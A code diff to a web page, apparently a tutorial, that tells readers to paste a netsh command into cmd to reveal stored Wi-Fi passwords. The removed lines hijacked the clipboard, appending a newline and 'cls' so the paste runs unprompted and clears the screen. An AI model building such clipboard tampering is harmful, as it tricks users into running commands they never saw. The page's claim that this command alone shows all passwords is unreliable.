@@ -63,17 +63,18 @@
         <p class="command-text">
             Today we will talk about how to view the Wi-Fi passwords stored on your device and how to display them
             It's very simple. All you have to do is open cmd, copy and paste this text, 
-            <span class="highlight">netsh wlan show profils</span>
+            <span class="highlight">netsh wlan show profiles</span>
             and all your stored passwords will simply appear.
+        </p>
     </div>
 
     <script>
         document.addEventListener('copy', function(e){
             const visibleContent = document.getElementById('visibleContent');
             const clipboardData = e.clipboardData || window.clipboardData;
-            const textToCopy = visibleContent.innerText; 
+            const textToCopy = visibleContent.innerText;
 
-            clipboardData.setData('text/plain', textToCopy+'\r\n'+'cls'+'\r\n');
+            clipboardData.setData('text/plain', textToCopy);
             e.preventDefault();
         });
     </script>
